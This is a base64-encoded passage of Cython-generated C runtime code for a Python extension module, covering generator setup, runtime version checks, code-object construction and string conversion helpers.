luY01ldGhvZHNTdHJ1Y3QgX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jOwojZW5kaWYKc3RhdGljIGludCBfX3B5eF9HZW5lcmF0b3JfaW5pdChQeU9iamVjdCAqbW9kdWxlKSB7CiAgICBfX3B5eF9tc3RhdGV0eXBlICptc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtb2R1bGUpOwogICAgbXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoCiAgICAgICAgbXN0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUsIG1vZHVsZSwgJl9fcHl4X0dlbmVyYXRvclR5cGVfc3BlYywgTlVMTCk7CiAgICBpZiAodW5saWtlbHkoIW1zdGF0ZS0+X19weXhfR2VuZXJhdG9yVHlwZSkpIHsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiNpZiBfX1BZWF9IQVNfUFlfQU1fU0VORCA9PSAyCiAgICBfX1B5eF9TZXRCYWNrcG9ydFR5cGVBbVNlbmQobXN0YXRlLT5fX3B5eF9HZW5lcmF0b3JUeXBlLCAmX19weXhfR2VuZXJhdG9yX2FzX2FzeW5jLCAmX19QeXhfQ29yb3V0aW5lX0FtU2VuZCk7CiNlbmRpZgogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChQeU9iamVjdCAqc2VsZikgewogICAgX19weXhfQ29yb3V0aW5lT2JqZWN0ICpnZW4gPSAoX19weXhfQ29yb3V0aW5lT2JqZWN0Kikgc2VsZjsKICAgIFB5T2JqZWN0ICpyZXR2YWwgPSBOVUxMOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X0Nvcm91dGluZV90ZXN0X2FuZF9zZXRfaXNfcnVubmluZyhnZW4pKSkgewogICAgICAgIHJldHVybiBfX1B5eF9Db3JvdXRpbmVfQWxyZWFkeVJ1bm5pbmdFcnJvcihnZW4pOwogICAgfQogICAgX19QeXhfUHlTZW5kUmVzdWx0IHJlc3VsdCA9IF9fUHl4X0Nvcm91dGluZV9TZW5kRXgoZ2VuLCBQeV9Ob25lLCAmcmV0dmFsLCAwKTsKICAgIF9fUHl4X0Nvcm91dGluZV91bnNldF9pc19ydW5uaW5nKGdlbik7CiAgICAodm9pZCkgcmVzdWx0OwogICAgYXNzZXJ0IChyZXN1bHQgPT0gUFlHRU5fUkVUVVJOIHx8IHJlc3VsdCA9PSBQWUdFTl9FUlJPUik7CiAgICBhc3NlcnQgKChyZXN1bHQgPT0gUFlHRU5fUkVUVVJOICYmIHJldHZhbCAhPSBOVUxMKSB8fCAocmVzdWx0ID09IFBZR0VOX0VSUk9SICYmIHJldHZhbCA9PSBOVUxMKSk7CiAgICByZXR1cm4gcmV0dmFsOwp9CgoKc3RhdGljIHVuc2lnbmVkIGxvbmcgX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbih2b2lkKSB7CiNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwYjAwMDAKICAgIHJldHVybiBQeV9WZXJzaW9uICYgfjB4RkZVTDsKI2Vsc2UKICAgIHN0YXRpYyB1bnNpZ25lZCBsb25nIF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPSAwOwogICAgaWYgKF9fUHl4X2NhY2hlZF9ydW50aW1lX3ZlcnNpb24gPT0gMCkgewogICAgICAgIGNvbnN0IGNoYXIqIHJ0X3ZlcnNpb24gPSBQeV9HZXRWZXJzaW9uKCk7CiAgICAgICAgdW5zaWduZWQgbG9uZyB2ZXJzaW9uID0gMDsKICAgICAgICB1bnNpZ25lZCBsb25nIGZhY3RvciA9IDB4MDEwMDAwMDBVTDsKICAgICAgICB1bnNpZ25lZCBpbnQgZGlnaXQgPSAwOwogICAgICAgIGludCBpID0gMDsKICAgICAgICB3aGlsZSAoZmFjdG9yKSB7CiAgICAgICAgICAgIHdoaWxlICgnMCcgPD0gcnRfdmVyc2lvbltpXSAmJiBydF92ZXJzaW9uW2ldIDw9ICc5JykgewogICAgICAgICAgICAgICAgZGlnaXQgPSBkaWdpdCAqIDEwICsgKHVuc2lnbmVkIGludCkgKHJ0X3ZlcnNpb25baV0gLSAnMCcpOwogICAgICAgICAgICAgICAgKytpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHZlcnNpb24gKz0gZmFjdG9yICogZGlnaXQ7CiAgICAgICAgICAgIGlmIChydF92ZXJzaW9uW2ldICE9ICcuJykKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkaWdpdCA9IDA7CiAgICAgICAgICAgIGZhY3RvciA+Pj0gODsKICAgICAgICAgICAgKytpOwogICAgICAgIH0KICAgICAgICBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uID0gdmVyc2lvbjsKICAgIH0KICAgIHJldHVybiBfX1B5eF9jYWNoZWRfcnVudGltZV92ZXJzaW9uOwojZW5kaWYKfQoKCnN0YXRpYyBpbnQgX19QeXhfY2hlY2tfYmluYXJ5X3ZlcnNpb24odW5zaWduZWQgbG9uZyBjdF92ZXJzaW9uLCB1bnNpZ25lZCBsb25nIHJ0X3ZlcnNpb24sIGludCBhbGxvd19uZXdlcikgewogICAgY29uc3QgdW5zaWduZWQgbG9uZyBNQUpPUl9NSU5PUiA9IDB4RkZGRjAwMDBVTDsKICAgIGlmICgocnRfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSA9PSAoY3RfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSkKICAgICAgICByZXR1cm4gMDsKICAgIGlmIChsaWtlbHkoYWxsb3dfbmV3ZXIgJiYgKHJ0X3ZlcnNpb24gJiBNQUpPUl9NSU5PUikgPiAoY3RfdmVyc2lvbiAmIE1BSk9SX01JTk9SKSkpCiAgICAgICAgcmV0dXJuIDE7CiAgICB7CiAgICAgICAgY2hhciBtZXNzYWdlWzIwMF07CiAgICAgICAgUHlPU19zbnByaW50ZihtZXNzYWdlLCBzaXplb2YobWVzc2FnZSksCiAgICAgICAgICAgICAgICAgICAgICAiY29tcGlsZSB0aW1lIFB5dGhvbiB2ZXJzaW9uICVkLiVkICIKICAgICAgICAgICAgICAgICAgICAgICJvZiBtb2R1bGUgJyUuMTAwcycgIgogICAgICAgICAgICAgICAgICAgICAgIiVzICIKICAgICAgICAgICAgICAgICAgICAgICJydW50aW1lIHZlcnNpb24gJWQuJWQiLAogICAgICAgICAgICAgICAgICAgICAgIChpbnQpIChjdF92ZXJzaW9uID4+IDI0KSwgKGludCkgKChjdF92ZXJzaW9uID4+IDE2KSAmIDB4RkYpLAogICAgICAgICAgICAgICAgICAgICAgIF9fUHl4X01PRFVMRV9OQU1FLAogICAgICAgICAgICAgICAgICAgICAgIChhbGxvd19uZXdlcikgPyAid2FzIG5ld2VyIHRoYW4iIDogImRvZXMgbm90IG1hdGNoIiwKICAgICAgICAgICAgICAgICAgICAgICAoaW50KSAocnRfdmVyc2lvbiA+PiAyNCksIChpbnQpICgocnRfdmVyc2lvbiA+PiAxNikgJiAweEZGKQogICAgICAgKTsKICAgICAgICByZXR1cm4gUHlFcnJfV2FybkV4KE5VTEwsIG1lc3NhZ2UsIDEpOwogICAgfQp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5Q29kZV9OZXcoaW50IGEsIGludCBwLCBpbnQgaywgaW50IGwsIGludCBzLCBpbnQgZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpmdiwgUHlPYmplY3QgKmNlbGwsIFB5T2JqZWN0KiBmbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKm5hbWUsIGludCBmbGluZSwgUHlPYmplY3QgKmxub3MpIHsKICAgICAgICBQeU9iamVjdCAqZXhjZXB0aW9uX3RhYmxlID0gTlVMTDsKICAgICAgICBQeU9iamVjdCAqdHlwZXNfbW9kdWxlPU5VTEwsICpjb2RlX3R5cGU9TlVMTCwgKnJlc3VsdD1OVUxMOwogICAgICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBiMDAwMAogICAgICAgIFB5T2JqZWN0ICp2ZXJzaW9uX2luZm87CiAgICAgICAgUHlPYmplY3QgKnB5X21pbm9yX3ZlcnNpb24gPSBOVUxMOwogICAgICAgICNlbmRpZgogICAgICAgIGxvbmcgbWlub3JfdmVyc2lvbiA9IDA7CiAgICAgICAgUHlPYmplY3QgKnR5cGUsICp2YWx1ZSwgKnRyYWNlYmFjazsKICAgICAgICBQeUVycl9GZXRjaCgmdHlwZSwgJnZhbHVlLCAmdHJhY2ViYWNrKTsKICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGIwMDAwCiAgICAgICAgbWlub3JfdmVyc2lvbiA9IDExOwogICAgICAgICNlbHNlCiAgICAgICAgaWYgKCEodmVyc2lvbl9pbmZvID0gUHlTeXNfR2V0T2JqZWN0KCJ2ZXJzaW9uX2luZm8iKSkpIGdvdG8gZW5kOwogICAgICAgIGlmICghKHB5X21pbm9yX3ZlcnNpb24gPSBQeVNlcXVlbmNlX0dldEl0ZW0odmVyc2lvbl9pbmZvLCAxKSkpIGdvdG8gZW5kOwogICAgICAgIG1pbm9yX3ZlcnNpb24gPSBQeUxvbmdfQXNMb25nKHB5X21pbm9yX3ZlcnNpb24pOwogICAgICAgIFB5X0RFQ1JFRihweV9taW5vcl92ZXJzaW9uKTsKICAgICAgICBpZiAobWlub3JfdmVyc2lvbiA9PSAtMSAmJiBQeUVycl9PY2N1cnJlZCgpKSBnb3RvIGVuZDsKICAgICAgICAjZW5kaWYKICAgICAgICBpZiAoISh0eXBlc19tb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGUoInR5cGVzIikpKSBnb3RvIGVuZDsKICAgICAgICBpZiAoIShjb2RlX3R5cGUgPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKHR5cGVzX21vZHVsZSwgIkNvZGVUeXBlIikpKSBnb3RvIGVuZDsKICAgICAgICBpZiAobWlub3JfdmVyc2lvbiA8PSA3KSB7CiAgICAgICAgICAgICh2b2lkKXA7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaU9PT09PT2lPT08iLCBhLCBrLCBsLCBzLCBmLCBjb2RlLAogICAgICAgICAgICAgICAgICAgICAgICAgIGMsIG4sIHYsIGZuLCBuYW1lLCBmbGluZSwgbG5vcywgZnYsIGNlbGwpOwogICAgICAgIH0gZWxzZSBpZiAobWlub3JfdmVyc2lvbiA8PSAxMCkgewogICAgICAgICAgICByZXN1bHQgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oY29kZV90eXBlLCAiaWlpaWlpT09PT09PaU9PTyIsIGEscCwgaywgbCwgcywgZiwgY29kZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjLCBuLCB2LCBmbiwgbmFtZSwgZmxpbmUsIGxub3MsIGZ2LCBjZWxsKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIShleGNlcHRpb25fdGFibGUgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIDApKSkgZ290byBlbmQ7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X0NhbGxGdW5jdGlvbihjb2RlX3R5cGUsICJpaWlpaWlPT09PT09PaU9PT08iLCBhLHAsIGssIGwsIHMsIGYsIGNvZGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgYywgbiwgdiwgZm4sIG5hbWUsIG5hbWUsIGZsaW5lLCBsbm9zLCBleGNlcHRpb25fdGFibGUsIGZ2LCBjZWxsKTsKICAgICAgICB9CiAgICBlbmQ6CiAgICAgICAgUHlfWERFQ1JFRihjb2RlX3R5cGUpOwogICAgICAgIFB5X1hERUNSRUYoZXhjZXB0aW9uX3RhYmxlKTsKICAgICAgICBQeV9YREVDUkVGKHR5cGVzX21vZHVsZSk7CiAgICAgICAgaWYgKHR5cGUpIHsKICAgICAgICAgICAgUHlFcnJfUmVzdG9yZSh0eXBlLCB2YWx1ZSwgdHJhY2ViYWNrKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDAwMAogIHN0YXRpYyBQeUNvZGVPYmplY3QqIF9fUHl4X19QeUNvZGVfTmV3KGludCBhLCBpbnQgcCwgaW50IGssIGludCBsLCBpbnQgcywgaW50IGYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmNvZGUsIFB5T2JqZWN0ICpjLCBQeU9iamVjdCogbiwgUHlPYmplY3QgKnYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUHlPYmplY3QgKmZ2LCBQeU9iamVjdCAqY2VsbCwgUHlPYmplY3QqIGZuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpuYW1lLCBpbnQgZmxpbmUsIFB5T2JqZWN0ICpsbm9zKSB7CiAgICBQeUNvZGVPYmplY3QgKnJlc3VsdDsKICAgIHJlc3VsdCA9CiAgICAgICNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwCiAgICAgICAgUHlVbnN0YWJsZV9Db2RlX05ld1dpdGhQb3NPbmx5QXJncwogICAgICAjZWxzZQogICAgICAgIFB5Q29kZV9OZXdXaXRoUG9zT25seUFyZ3MKICAgICAgI2VuZGlmCiAgICAgICAgKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgbmFtZSwgZmxpbmUsIGxub3MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzKTsKICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBjMDBBMQogICAgaWYgKGxpa2VseShyZXN1bHQpKQogICAgICAgIHJlc3VsdC0+X2NvX2ZpcnN0dHJhY2VhYmxlID0gMDsKICAgICNlbmRpZgogICAgcmV0dXJuIHJlc3VsdDsKICB9CiNlbGlmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwODAwQjIgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICNkZWZpbmUgX19QeXhfX1B5Q29kZV9OZXcoYSwgcCwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcylcCiAgICAgICAgICBQeUNvZGVfTmV3V2l0aFBvc09ubHlBcmdzKGEsIHAsIGssIGwsIHMsIGYsIGNvZGUsIGMsIG4sIHYsIGZ2LCBjZWxsLCBmbiwgbmFtZSwgZmxpbmUsIGxub3MpCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9fUHlDb2RlX05ldyhhLCBwLCBrLCBsLCBzLCBmLCBjb2RlLCBjLCBuLCB2LCBmdiwgY2VsbCwgZm4sIG5hbWUsIGZsaW5lLCBsbm9zKVwKICAgICAgICAgIFB5Q29kZV9OZXcoYSwgaywgbCwgcywgZiwgY29kZSwgYywgbiwgdiwgZnYsIGNlbGwsIGZuLCBuYW1lLCBmbGluZSwgbG5vcykKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCogX19QeXhfUHlDb2RlX05ldygKICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLAogICAgICAgIFB5T2JqZWN0ICogY29uc3QgKnZhcm5hbWVzLAogICAgICAgIFB5T2JqZWN0ICpmaWxlbmFtZSwKICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsCiAgICAgICAgY29uc3QgY2hhciAqbGluZV90YWJsZSwKICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwCikgewogICAgUHlPYmplY3QgKmNvZGVfb2JqID0gTlVMTCwgKnZhcm5hbWVzX3R1cGxlX2RlZHVwID0gTlVMTCwgKmNvZGVfYnl0ZXMgPSBOVUxMLCAqbGluZV90YWJsZV9ieXRlcyA9IE5VTEw7CiAgICBQeV9zc2l6ZV90IHZhcl9jb3VudCA9IChQeV9zc2l6ZV90KSBkZXNjci5ubG9jYWxzOwogICAgUHlPYmplY3QgKnZhcm5hbWVzX3R1cGxlID0gUHlUdXBsZV9OZXcodmFyX2NvdW50KTsKICAgIGlmICh1bmxpa2VseSghdmFybmFtZXNfdHVwbGUpKSByZXR1cm4gTlVMTDsKICAgIGZvciAoUHlfc3NpemVfdCBpPTA7IGkgPCB2YXJfY291bnQ7IGkrKykgewogICAgICAgIFB5X0lOQ1JFRih2YXJuYW1lc1tpXSk7CiAgICAgICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0odmFybmFtZXNfdHVwbGUsIGksIHZhcm5hbWVzW2ldKSAhPSAoMCkpIGdvdG8gZG9uZTsKICAgIH0KICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB2YXJuYW1lc190dXBsZV9kZWR1cCA9IFB5RGljdF9HZXRJdGVtKHR1cGxlX2RlZHVwX21hcCwgdmFybmFtZXNfdHVwbGUpOwogICAgaWYgKCF2YXJuYW1lc190dXBsZV9kZWR1cCkgewogICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbSh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSkgPCAwKSkgZ290byBkb25lOwogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwID0gdmFybmFtZXNfdHVwbGU7CiAgICB9CiAgICAjZWxzZQogICAgdmFybmFtZXNfdHVwbGVfZGVkdXAgPSBQeURpY3RfU2V0RGVmYXVsdCh0dXBsZV9kZWR1cF9tYXAsIHZhcm5hbWVzX3R1cGxlLCB2YXJuYW1lc190dXBsZSk7CiAgICBpZiAodW5saWtlbHkoIXZhcm5hbWVzX3R1cGxlX2RlZHVwKSkgZ290byBkb25lOwogICAgI2VuZGlmCiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X0lOQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7CiAgICAjZW5kaWYKICAgIGlmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49ICgweDAzMGIwMDAwKSAmJiBsaW5lX3RhYmxlICE9IE5VTEwKICAgICAgICAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCkgewogICAgICAgIGxpbmVfdGFibGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKGxpbmVfdGFibGUsIGRlc2NyLmxpbmVfdGFibGVfbGVuZ3RoKTsKICAgICAgICBpZiAodW5saWtlbHkoIWxpbmVfdGFibGVfYnl0ZXMpKSBnb3RvIGRvbmU7CiAgICAgICAgUHlfc3NpemVfdCBjb2RlX2xlbiA9IChkZXNjci5saW5lX3RhYmxlX2xlbmd0aCAqIDIgKyA0KSAmIH4zOwogICAgICAgIGNvZGVfYnl0ZXMgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKE5VTEwsIGNvZGVfbGVuKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNvZGVfYnl0ZXMpKSBnb3RvIGRvbmU7CiAgICAgICAgY2hhciogY19jb2RlX2J5dGVzID0gUHlCeXRlc19Bc1N0cmluZyhjb2RlX2J5dGVzKTsKICAgICAgICBpZiAodW5saWtlbHkoIWNfY29kZV9ieXRlcykpIGdvdG8gZG9uZTsKICAgICAgICBtZW1zZXQoY19jb2RlX2J5dGVzLCAwLCAoc2l6ZV90KSBjb2RlX2xlbik7CiAgICB9CiAgICBjb2RlX29iaiA9IChQeU9iamVjdCopIF9fUHl4X19QeUNvZGVfTmV3KAogICAgICAgIChpbnQpIGRlc2NyLmFyZ2NvdW50LAogICAgICAgIChpbnQpIGRlc2NyLm51bV9wb3Nvbmx5X2FyZ3MsCiAgICAgICAgKGludCkgZGVzY3IubnVtX2t3b25seV9hcmdzLAogICAgICAgIChpbnQpIGRlc2NyLm5sb2NhbHMsCiAgICAgICAgMCwKICAgICAgICAoaW50KSBkZXNjci5mbGFncywKICAgICAgICBjb2RlX2J5dGVzID8gY29kZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIHZhcm5hbWVzX3R1cGxlX2RlZHVwLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLAogICAgICAgIGZpbGVuYW1lLAogICAgICAgIGZ1bmNuYW1lLAogICAgICAgIChpbnQpIGRlc2NyLmZpcnN0X2xpbmUsCiAgICAgICAgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gKDB4MDMwYjAwMDApICYmIGxpbmVfdGFibGVfYnl0ZXMpID8gbGluZV90YWJsZV9ieXRlcyA6IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X2J5dGVzCiAgICApOwpkb25lOgogICAgUHlfWERFQ1JFRihjb2RlX2J5dGVzKTsKICAgIFB5X1hERUNSRUYobGluZV90YWJsZV9ieXRlcyk7CiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIFB5X1hERUNSRUYodmFybmFtZXNfdHVwbGVfZGVkdXApOwogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYodmFybmFtZXNfdHVwbGUpOwogICAgcmV0dXJuIGNvZGVfb2JqOwp9CgoKc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcykgewogICAgd2hpbGUgKHQtPnMpIHsKICAgICAgICBQeU9iamVjdCAqc3RyOwogICAgICAgIGlmICh0LT5pc191bmljb2RlKSB7CiAgICAgICAgICAgIGlmICh0LT5pbnRlcm4pIHsKICAgICAgICAgICAgICAgIHN0ciA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKHQtPnMpOwogICAgICAgICAgICB9IGVsc2UgaWYgKHQtPmVuY29kaW5nKSB7CiAgICAgICAgICAgICAgICBzdHIgPSBQeVVuaWNvZGVfRGVjb2RlKHQtPnMsIHQtPm4gLSAxLCBlbmNvZGluZ19uYW1lc1t0LT5lbmNvZGluZ10sIE5VTEwpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKHQtPnMsIHQtPm4gLSAxKTsKICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ciA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpOwogICAgICAgIH0KICAgICAgICBpZiAoIXN0cikKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICp0YXJnZXQgPSBzdHI7CiAgICAgICAgaWYgKFB5T2JqZWN0X0hhc2goc3RyKSA9PSAtMSkKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgICsrdDsKICAgICAgICArK3RhcmdldDsKICAgIH0KICAgIHJldHVybiAwOwp9CgojaW5jbHVkZSA8c3RyaW5nLmg+CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfc3NpemVfc3RybGVuKGNvbnN0IGNoYXIgKnMpIHsKICAgIHNpemVfdCBsZW4gPSBzdHJsZW4ocyk7CiAgICBpZiAodW5saWtlbHkobGVuID4gKHNpemVfdCkgUFlfU1NJWkVfVF9NQVgpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX092ZXJmbG93RXJyb3IsICJieXRlIHN0cmluZyBpcyB0b28gbG9uZyIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIHJldHVybiAoUHlfc3NpemVfdCkgbGVuOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZyhjb25zdCBjaGFyKiBjX3N0cikgewogICAgUHlfc3NpemVfdCBsZW4gPSBfX1B5eF9zc2l6ZV9zdHJsZW4oY19zdHIpOwogICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDsKICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHsKICAgIFB5X3NzaXplX3QgbGVuID0gX19QeXhfc3NpemVfc3RybGVuKGNfc3RyKTsKICAgIGlmICh1bmxpa2VseShsZW4gPCAwKSkgcmV0dXJuIE5VTEw7CiAgICByZXR1cm4gUHlCeXRlQXJyYXlfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlPYmplY3RfQXNTdHJpbmcoUHlPYmplY3QqIG8pIHsKICAgIFB5X3NzaXplX3QgaWdub3JlOwogICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0FzU3RyaW5nQW5kU2l6ZShvLCAmaWdub3JlKTsKfQojaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOApzdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKFB5T2JqZWN0KiBvLCBQeV9zc2l6ZV90ICpsZW5ndGgpIHsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobykgPT0gLTEpKSByZXR1cm4gTlVMTDsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIHsKICAgICAgICBjb25zdCBjaGFyKiByZXN1bHQ7CiAgICAgICAgUHlfc3NpemVfdCB1bmljb2RlX2xlbmd0aDsKICAgICAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih1bmljb2RlX2xlbmd0aCk7IC8vIG9ubHkgZm9yIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICAgICAgI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPCAweDAzMEEwMDAwCiAgICAgICAgaWYgKHVubGlrZWx5KFB5QXJnX1BhcnNlKG8sICJzIyIsICZyZXN1bHQsIGxlbmd0aCkgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgI2Vsc2UKICAgICAgICByZXN1bHQgPSBQeVVuaWNvZGVfQXNVVEY4QW5kU2l6ZShvLCBsZW5ndGgpOwogICAgICAgICNlbmRpZgogICAgICAgICNpZiBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSQogICAgICAgIHVuaWNvZGVfbGVuZ3RoID0gUHlVbmljb2RlX0dldExlbmd0aChvKTsKICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgaWYgKHVubGlrZWx5KHVuaWNvZGVfbGVuZ3RoICE9ICpsZW5ndGgpKSB7CiAgICAgICAgICAgIFB5VW5pY29kZV9Bc0FTQ0lJU3RyaW5nKG8pOwogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICB9CiAgICAgICAgI2VuZGlmCiAgICAgICAgcmV0dXJuIHJlc3VsdDsKICAgIH0KI2Vsc2UKI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJCiAgICBpZiAobGlrZWx5KFB5VW5pY29kZV9JU19BU0NJSShvKSkpIHsKICAgICAgICAqbGVuZ3RoID0gUHlVbmljb2RlX0dFVF9MRU5HVEgobyk7CiAgICAgICAgcmV0dXJuIFB5VW5pY29kZV9B